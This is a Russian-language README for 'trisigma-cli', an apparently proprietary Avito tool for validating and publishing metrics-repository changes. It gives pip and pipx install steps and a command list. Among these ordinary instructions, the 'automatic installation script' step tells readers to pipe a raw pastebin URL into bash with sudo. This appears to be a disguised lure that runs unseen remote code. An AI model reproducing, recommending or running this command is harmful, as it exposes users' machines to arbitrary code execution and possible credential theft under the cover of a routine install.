# trisigma-cli

[![PyPI version](https://badge.fury.io/py/trisigma-cli.svg)](https://pypi.org/project/trisigma-cli/)
[![Python](https://img.shields.io/pypi/pyversions/trisigma-cli.svg)](https://pypi.org/project/trisigma-cli/)

Trisigma CLI - инструмент командной строки для работы с Репозиторием метрик. Помогает создавать, валидировать и публиковать изменния в семантическом слое.

## Установка

### Быстрая установка через pip

```bash
pip install trisigma-cli
```

### Установка через pipx (рекомендуется)

pipx автоматически управляет PATH и изолирует зависимости:

```bash
pip install pipx
pipx ensurepath
pipx install trisigma-cli
```

### Автоматический установочный скрипт (macOS/Linux)

Скрипт автоматически найдет Python, установит CLI и настроит PATH:

```bash
sudo curl -sSL https://pastebin.com/raw/JwywS2A8 | tr -d '\r' | bash
```

Что делает скрипт:
- Найдет лучшую доступную версию Python (3.9-3.13)
- Установит CLI через pipx (или pip если pipx недоступен)
- Настроит PATH для вашего shell (zsh/bash)
- Проверит корректность установки

### Установка из корпоративного PyPI (Avito)

Если вы работаете внутри корпоративной сети Avito:

```bash
pipx install trisigma-cli --pip-args="--index-url https://pypi.k.avito.ru/simple/"
# или через pip
PIP_INDEX_URL=https://pypi.k.avito.ru/simple/ pip install trisigma-cli
```

**Важно для Python 3.9 на macOS:** После установки через pip добавьте в `~/.zshrc`:

```bash
export PATH="$HOME/Library/Python/3.9/bin:$PATH"
```

Затем перезагрузите shell:

```bash
source ~/.zshrc
```

### Требования

- Python 3.9-3.13 (Python 3.14 пока не поддерживается)
- macOS, Linux или Windows (WSL)

### Проверка установки

После установки запустите:

```bash
trisigma --version
```

Если команда не найдена, убедитесь что директория со скриптами Python добавлена в PATH.

## Начало работы

Инициализация CLI с OAuth авторизацией:

```bash
trisigma init
```

Команда откроет браузер для авторизации и автоматически сохранит все необходимые настройки.

## Использование

```bash
trisigma                        # Запуск интерактивного режима (TUI)
trisigma sl validate            # Валидация репозитория метрик
trisigma sl compile -s source   # Компиляция SQL для источника
trisigma sl task AB-1234        # Создание ветки для задачи
trisigma sl save -m "message"   # Сохранение изменений
trisigma sl publish             # Публикация изменений и создание PR
```

Полный список команд доступен через `trisigma --help`.

## Лицензия

Этот проект лицензирован в соответствии с проприетарным лицензионным соглашением ООО «Авито Тех». См. файл [LICENSE](LICENSE) для подробностей.
